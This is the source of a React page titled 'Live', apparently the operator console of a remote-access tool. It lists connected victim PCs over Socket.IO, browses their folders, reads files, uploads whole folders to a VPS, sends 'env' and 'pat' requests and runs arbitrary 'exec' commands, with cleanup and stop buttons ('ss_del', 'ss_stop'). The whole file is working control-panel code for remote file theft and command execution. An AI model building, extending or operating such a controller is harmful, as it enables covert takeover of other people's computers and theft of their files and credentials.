"use client";

import { FormEvent, useEffect, useMemo, useRef, useState } from "react";
import { io, type Socket } from "socket.io-client";
import { API_URL, api, getToken } from "@/lib/api";
import { formatDate } from "@/lib/format";

type Reply = { event: string; payload: unknown; at: string };

type LiveSocket = {
  socketId: string;
  username: string;
  client_id: string | number;
  connectedAt: string;
  lastEvent: string;
  replies: Reply[];
};

type DirEntry = { name: string; isDirectory: boolean; isFile: boolean };
type DirResult = { currentPath: string; contents: DirEntry[] };
type FileContent = { filename?: string; content?: string; message?: string };

const TEXT_EXT =
  /\.(txt|log|md|json|csv|xml|html|htm|css|js|ts|tsx|jsx|yml|yaml|ini|conf|cfg|env|py|java|c|h|sql|bat|ps1|sh|php|rb|go|rs|toml|svg)$/i;

function joinClientPath(base: string, name: string) {
  const root = String(base || "").replace(/[\\/]+$/, "");
  const sep = root.includes("\\") || /^[a-zA-Z]:/.test(root) ? "\\" : "/";
  if (!root) return name;
  if (!name) return root;
  return `${root}${sep}${name}`;
}

function parentPath(path: string) {
  const value = String(path || "").replace(/[\\/]+$/, "");
  if (!value) return "";
  if (/^[a-zA-Z]:$/.test(value)) return value;
  const sep = value.includes("\\") ? "\\" : "/";
  const parts = value.split(/[\\/]/).filter(Boolean);
  if (parts.length <= 1) return /^[a-zA-Z]:/.test(value) ? `${parts[0]}\\` : "/";
  const next = parts.slice(0, -1).join(sep);
  return /^[a-zA-Z]:/.test(value) && !next.endsWith(":") ? next : next;
}

function entryKey(entry: DirEntry) {
  return `${entry.isDirectory ? "d" : "f"}:${entry.name}`;
}

function isTextName(name: string) {
  return TEXT_EXT.test(name) || !name.includes(".");
}

function asText(value: unknown) {
  if (typeof value === "string") return value;
  try {
    return JSON.stringify(value, null, 2);
  } catch {
    return String(value);
  }
}

function saveToLaptop(filename: string, content: string) {
  const blob = new Blob([content], { type: "text/plain;charset=utf-8" });
  const url = URL.createObjectURL(blob);
  const link = document.createElement("a");
  link.href = url;
  link.download = filename || "file.txt";
  document.body.appendChild(link);
  link.click();
  link.remove();
  URL.revokeObjectURL(url);
}

function FileRow({
  entry,
  picked,
  onToggleSelect,
  onOpen,
}: {
  entry: DirEntry;
  picked: boolean;
  onToggleSelect: () => void;
  onOpen: () => void;
}) {
  const timer = useRef<number | null>(null);
  const longPress = useRef(false);

  function clearTimer() {
    if (timer.current) window.clearTimeout(timer.current);
    timer.current = null;
  }

  return (
    <tr
      className={`fe-row row-click ${picked ? "picked" : ""}`}
      onPointerDown={() => {
        longPress.current = false;
        clearTimer();
        timer.current = window.setTimeout(() => {
          longPress.current = true;
          onToggleSelect();
        }, 500);
      }}
      onPointerUp={clearTimer}
      onPointerLeave={clearTimer}
      onClick={(event) => {
        if (longPress.current) {
          event.preventDefault();
          longPress.current = false;
          return;
        }
        if (event.ctrlKey || event.metaKey) onToggleSelect();
      }}
      onDoubleClick={() => {
        if (!longPress.current) onOpen();
      }}
    >
      <td>{entry.name}</td>
      <td>
        <span className={`badge ${entry.isDirectory ? "" : "badge-text"}`}>
          {entry.isDirectory ? "folder" : "file"}
        </span>
      </td>
    </tr>
  );
}

export default function LivePage() {
  const [sockets, setSockets] = useState<LiveSocket[]>([]);
  const [selectedId, setSelectedId] = useState("");
  const [error, setError] = useState("");
  const [status, setStatus] = useState("");
  const [listing, setListing] = useState<DirResult | null>(null);
  const [address, setAddress] = useState("");
  const [picked, setPicked] = useState<Set<string>>(new Set());
  const [preview, setPreview] = useState<{ filename: string; content: string } | null>(null);
  const [showAdvanced, setShowAdvanced] = useState(false);
  const [folderName, setFolderName] = useState("");
  const [pat, setPat] = useState("");
  const [instruction, setInstruction] = useState("");
  const [busy, setBusy] = useState(false);
  const selectedIdRef = useRef("");
  const historyRef = useRef<string[]>([]);
  const fileWaiters = useRef<Array<(payload: FileContent & { error?: boolean }) => void>>([]);

  const selected = sockets.find((row) => row.socketId === selectedId) || null;
  selectedIdRef.current = selectedId;

  const items = useMemo(() => {
    const rows = [...(listing?.contents || [])];
    return rows.sort((a, b) => {
      if (a.isDirectory !== b.isDirectory) return a.isDirectory ? -1 : 1;
      return a.name.localeCompare(b.name);
    });
  }, [listing]);

  async function send(event: string, data: unknown) {
    if (!selectedIdRef.current) {
      setError("Select an online client first");
      return;
    }
    setError("");
    await api(`/admin/sockets/${encodeURIComponent(selectedIdRef.current)}/command`, {
      method: "POST",
      body: JSON.stringify({ event, data }),
    });
  }

  function goTo(path: string, pushHistory = true) {
    const current = listing?.currentPath || "";
    if (pushHistory && current) historyRef.current.push(current);
    setPicked(new Set());
    setAddress(path);
    send("dir", path.trim().toLowerCase().startsWith("cd ") ? path.trim() : `cd ${path}`);
  }

  function resolveFileWaiter(payload: FileContent, errorFlag = false) {
    const waiter = fileWaiters.current.shift();
    if (waiter) {
      waiter({ ...payload, error: errorFlag });
      return true;
    }
    return false;
  }

  useEffect(() => {
    api<{ sockets: LiveSocket[] }>("/admin/sockets")
      .then((data) => {
        setSockets(data.sockets);
        if (!selectedId && data.sockets[0]) setSelectedId(data.sockets[0].socketId);
      })
      .catch((err) => setError(err.message));

    const socket = io(`${API_URL}/admin`, {
      auth: { token: getToken() },
      transports: ["websocket", "polling"],
    });
    socket.on("sockets", (list: LiveSocket[]) => setSockets(list));
    socket.on("socket_update", (payload: { sockets: LiveSocket[] }) => setSockets(payload.sockets));
    socket.on("client_reply", (entry: Reply & { socketId: string }) => {
      setSockets((prev) =>
        prev.map((row) =>
          row.socketId === entry.socketId
            ? { ...row, lastEvent: entry.event, replies: [...(row.replies || []), entry].slice(-100) }
            : row
        )
      );
      if (selectedIdRef.current !== entry.socketId) return;
      if (entry.event === "dir_result") {
        const payload = entry.payload as DirResult;
        if (payload && Array.isArray(payload.contents)) {
          setListing(payload);
          setAddress(payload.currentPath || "");
          setPicked(new Set());
          setStatus(payload.currentPath || "");
        }
      }
      if (entry.event === "file_content") {
        const payload = (entry.payload || {}) as FileContent;
        const handled = resolveFileWaiter(payload, false);
        if (!handled) {
          const filename = payload.filename || "file";
          const content = String(payload.content || "");
          if (isTextName(filename)) setPreview({ filename, content });
          else saveToLaptop(filename, content);
        }
      }
      if (entry.event === "file_error") {
        const payload = (entry.payload || {}) as FileContent;
        resolveFileWaiter(payload, true);
        setError(payload.message || "File read failed");
      }
      if (entry.event === "exec_result") {
        setStatus(asText(entry.payload));
      }
    });
    socket.on("connect_error", (err) => setError(err.message));
    return () => {
      socket.disconnect();
    };
  }, []);

  useEffect(() => {
    if (!selectedId) return;
    historyRef.current = [];
    setListing(null);
    setPicked(new Set());
    setPreview(null);
    setStatus("");
    send("dir", "cd .");
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [selectedId]);

  function waitForFile() {
    return new Promise<FileContent & { error?: boolean }>((resolve, reject) => {
      let wrapped: (payload: FileContent & { error?: boolean }) => void;
      const timer = window.setTimeout(() => {
        fileWaiters.current = fileWaiters.current.filter((item) => item !== wrapped);
        reject(new Error("Timed out waiting for file content"));
      }, 45000);
      wrapped = (payload) => {
        window.clearTimeout(timer);
        resolve(payload);
      };
      fileWaiters.current.push(wrapped);
    });
  }

  function togglePick(entry: DirEntry) {
    const key = entryKey(entry);
    setPicked((prev) => {
      const next = new Set(prev);
      if (next.has(key)) next.delete(key);
      else next.add(key);
      return next;
    });
  }

  function openEntry(entry: DirEntry) {
    const path = listing?.currentPath || address;
    if (entry.isDirectory) {
      goTo(joinClientPath(path, entry.name));
      return;
    }
    send("read_file", { filename: entry.name, path });
  }

  function selectAll() {
    setPicked(new Set(items.map(entryKey)));
  }

  async function downloadSelected() {
    if (!listing) {
      setError("Open a folder first");
      return;
    }
    const chosen = items.filter((item) => picked.has(entryKey(item)));
    setBusy(true);
    setError("");
    try {
      if (!chosen.length) {
        setStatus("Uploading current folder to VPS…");
        await send("upload", listing.currentPath);
        return;
      }
      for (const item of chosen) {
        if (item.isDirectory) {
          const folder = joinClientPath(listing.currentPath, item.name);
          setStatus(`Upload folder to VPS: ${folder}`);
          await send("upload", folder);
          await send("exec", `ss_upd ${item.name}`);
        } else {
          setStatus(`Download ${item.name}`);
          const pending = waitForFile();
          await send("read_file", { filename: item.name, path: listing.currentPath });
          const result = await pending;
          if (!result.error && typeof result.content === "string") {
            saveToLaptop(result.filename || item.name, result.content);
          }
          await send("exec", `ss_upf ${item.name}`);
        }
      }
      setStatus("Download finished");
    } catch (err) {
      setError(err instanceof Error ? err.message : "Download failed");
    } finally {
      setBusy(false);
    }
  }

  function onAddress(event: FormEvent) {
    event.preventDefault();
    goTo(address || ".");
  }

  return (
    <div>
      <div className="page-head">
        <div>
          <h1>Live</h1>
          <p>
            Remote explorer over Socket.IO. Double-click a folder to <span className="mono">cd</span>. Double-click a
            text file to open it. Press and hold to select.
          </p>
        </div>
      </div>
      {error ? <div className="error">{error}</div> : null}
      <div className="explorer" style={{ gridTemplateColumns: "250px minmax(0, 1fr)" }}>
        <div className="pane">
          <div className="pane-h">
            <strong>PCs online ({sockets.length})</strong>
          </div>
          {sockets.length === 0 ? <div className="empty">No client connected to /client</div> : null}
          {sockets.map((row) => (
            <button
              key={row.socketId}
              type="button"
              className={`list-item ${selectedId === row.socketId ? "active" : ""}`}
              onClick={() => setSelectedId(row.socketId)}
            >
              <span>
                <span className="dot" /> {row.username || "(waiting client_data)"}
                <small>
                  id {String(row.client_id || "—")} · {row.lastEvent} · {formatDate(row.connectedAt)}
                </small>
              </span>
            </button>
          ))}
        </div>
        <div className="pane">
          {!selected ? (
            <div className="empty">Waiting for a client connection.</div>
          ) : (
            <>
              <div className="pane-h">
                <div>
                  <strong>{selected.username || selected.socketId}</strong>
                  <div className="mono">client_id {String(selected.client_id || "—")}</div>
                </div>
              </div>
              <form className="fe-toolbar" onSubmit={onAddress}>
                <button
                  className="btn"
                  type="button"
                  onClick={() => {
                    const prev = historyRef.current.pop();
                    if (prev) goTo(prev, false);
                    else goTo("..", false);
                  }}
                >
                  Back
                </button>
                <button
                  className="btn"
                  type="button"
                  onClick={() => goTo(parentPath(listing?.currentPath || address) || "..", true)}
                >
                  Up
                </button>
                <input
                  className="fe-address"
                  value={address}
                  onChange={(e) => setAddress(e.target.value)}
                  placeholder="cd path — example D:\ or /home"
                />
                <button className="btn" type="submit">
                  Go
                </button>
                <button className="btn" type="button" onClick={() => goTo(listing?.currentPath || ".", false)}>
                  Refresh
                </button>
              </form>
              <div className="fe-toolbar">
                <button className="btn" type="button" onClick={selectAll} disabled={!items.length}>
                  Select all
                </button>
                <button className="btn" type="button" onClick={() => setPicked(new Set())} disabled={!picked.size}>
                  Clear
                </button>
                <button className="btn btn-primary" type="button" onClick={downloadSelected} disabled={busy} style={{ width: "auto" }}>
                  {busy ? "Working…" : "Download"}
                </button>
                <span className="mono">
                  {picked.size} selected
                  {listing?.currentPath ? ` · ${listing.currentPath}` : ""}
                </span>
              </div>
              <p className="fe-hint">
                Hold 500ms to select. Double-click folder = cd. Double-click text file = preview. Download saves text to
                this PC and asks the client to upload a copy to the VPS (`upload` / `ss_upf` / `ss_upd`).
              </p>
              <div className="table-wrap">
                <table>
                  <thead>
                    <tr>
                      <th>Name</th>
                      <th>Type</th>
                    </tr>
                  </thead>
                  <tbody>
                    {!listing ? (
                      <tr>
                        <td colSpan={2} className="empty">
                          Loading folder… If this stays empty, type a path and press Go.
                        </td>
                      </tr>
                    ) : items.length === 0 ? (
                      <tr>
                        <td colSpan={2} className="empty">
                          Empty folder.
                        </td>
                      </tr>
                    ) : (
                      items.map((entry) => (
                        <FileRow
                          key={entryKey(entry)}
                          entry={entry}
                          picked={picked.has(entryKey(entry))}
                          onToggleSelect={() => togglePick(entry)}
                          onOpen={() => openEntry(entry)}
                        />
                      ))
                    )}
                  </tbody>
                </table>
              </div>
              {status ? <pre className="preview" style={{ margin: 12 }}>{status}</pre> : null}

              <div style={{ padding: 12 }}>
                <button className="btn btn-ghost" type="button" onClick={() => setShowAdvanced((v) => !v)}>
                  {showAdvanced ? "Hide extra commands" : "Show extra commands"}
                </button>
              </div>
              {showAdvanced ? (
                <div className="cmd-grid">
                  <form
                    className="cmd-box"
                    onSubmit={(e) => {
                      e.preventDefault();
                      send("env", folderName);
                    }}
                  >
                    <h3>env / imp / upload</h3>
                    <input className="search" placeholder="folderName" value={folderName} onChange={(e) => setFolderName(e.target.value)} />
                    <div className="cmd-row">
                      <button className="btn" type="submit">env</button>
                      <button className="btn" type="button" onClick={() => send("imp", folderName)}>imp</button>
                      <button className="btn" type="button" onClick={() => send("upload", folderName || listing?.currentPath || "")}>upload</button>
                    </div>
                  </form>
                  <form
                    className="cmd-box"
                    onSubmit={(e) => {
                      e.preventDefault();
                      send("pat", { folderName, pat });
                    }}
                  >
                    <h3>pat</h3>
                    <input className="search" placeholder="pat" value={pat} onChange={(e) => setPat(e.target.value)} />
                    <button className="btn" type="submit" style={{ width: "auto" }}>Send pat</button>
                  </form>
                  <form
                    className="cmd-box"
                    style={{ gridColumn: "1 / -1" }}
                    onSubmit={(e) => {
                      e.preventDefault();
                      send("exec", instruction);
                    }}
                  >
                    <h3>exec</h3>
                    <input className="search" placeholder="instruction" value={instruction} onChange={(e) => setInstruction(e.target.value)} />
                    <div className="cmd-row">
                      <button className="btn" type="button" onClick={() => send("exec", "ss_del")}>ss_del</button>
                      <button className="btn" type="button" onClick={() => send("exec", "ss_stop")}>ss_stop</button>
                      <button className="btn" type="submit" style={{ width: "auto" }}>exec</button>
                    </div>
                  </form>
                </div>
              ) : null}
            </>
          )}
        </div>
      </div>

      {preview ? (
        <div className="modal-back" onClick={() => setPreview(null)}>
          <div className="modal" onClick={(e) => e.stopPropagation()}>
            <div className="modal-h">
              <strong>{preview.filename}</strong>
              <button
                className="btn"
                type="button"
                onClick={() => saveToLaptop(preview.filename, preview.content)}
              >
                Download to this PC
              </button>
            </div>
            <div className="modal-b">
              <pre className="preview">{preview.content}</pre>
            </div>
          </div>
        </div>
      ) : null}
    </div>
  );
}
